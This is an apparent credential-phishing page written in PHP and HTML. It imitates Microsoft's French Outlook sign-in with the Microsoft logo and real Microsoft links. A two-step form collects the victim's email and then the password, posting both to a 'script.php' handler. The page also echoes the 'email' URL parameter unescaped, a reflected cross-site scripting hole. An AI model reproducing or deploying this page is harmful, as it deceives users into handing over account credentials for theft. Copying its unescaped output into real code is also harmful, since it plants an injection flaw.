<!DOCTYPE html>
<html>
<head>
	<title>Se connecter a Outlook</title>
	<link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/1200px-Microsoft_logo.svg.png" />
	<!-- CSS only -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
</head>
<body>
	<center>
		<h1>Outlook</h1>
	</center>
<div class="container">
  <div class="row">
    <div class="col-sm">
      
    </div>
    
    <div class="col-sm" style="background-color: white;padding-top: 25px;padding-bottom: 25px;">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/1200px-Microsoft_logo.svg.png" style="height:30px;">
    <form method="POST" action="script.php">
    <b style="font-size: 20px;opacity: 0.6;">Microsoft</b><br>
    <?php 
    if (isset($_GET['email'])) {
    	?>
    	<p><?php echo$_GET['email']; ?></p>
    	<h3>Entrez le mot de passe</h3>
    	 <input type="text" style="width: 100%;border:none;border-bottom: 1px solid;height: 40px;"  placeholder="Mot de passe" name="password">
    	 <input type="hidden" name="email" value="<?php echo$_GET['email']; ?>" >

    	<?php
    	
    }else{
    	?><br>
    	<b style="font-size: 20px;">Se connecter</b><br>
    <span style="opacity: 0.8;">Continuer vers Outlook</span><br><br>
   
   	 <input type="text" style="width: 100%;border:none;border-bottom: 1px solid;height: 40px;"  placeholder="E-mail,telephone ou identitiant Skype" name="email">
    	<?php
    }
    ?>
    

   <p style="font-size: 13px;margin-top: 10px;">
   	 Pas de compte ? <a href="https://signup.live.com/signup?lcid=1033&wa=wsignin1.0&rpsnv=13&ct=1642023008&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fRpsCsrfState%3d93f9658d-7f11-40db-c71f-277daa8af453&id=292841&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&aadredir=0&lic=1&uaid=3963b5fb2a644856b5ce81444c48c90f">Créez-en un !</a><br><br>
	<a href="https://login.microsoftonline.com/common/oauth2/authorize">Votre compte n’est pas accessible ?</a>
   </p>
   <br>
   <div style="width: 100%;text-align: right;">
   	<?php 
   	if (isset($_GET['email'])) {
   		?><button type="submit" name="outlook" style="border:none;padding-right: 20px;padding-left: 20px;background-color: #005da6;color: white;">Se connecter</button><?php
   	}else{
   		?><button type="submit" name="outlook1" style="border:none;padding-right: 20px;padding-left: 20px;background-color: #005da6;color: white;">Suivant</button><?php
   	}
   	?>
   	
   </form>
   </div>
    </div>
    <div class="col-sm">
      
    </div>
  </div>


</div>
</body>
</html>
<style type="text/css">
	body{
		background-color: #e9e7e8 !important;
	}
	a{
		text-decoration: unset;
	}
</style>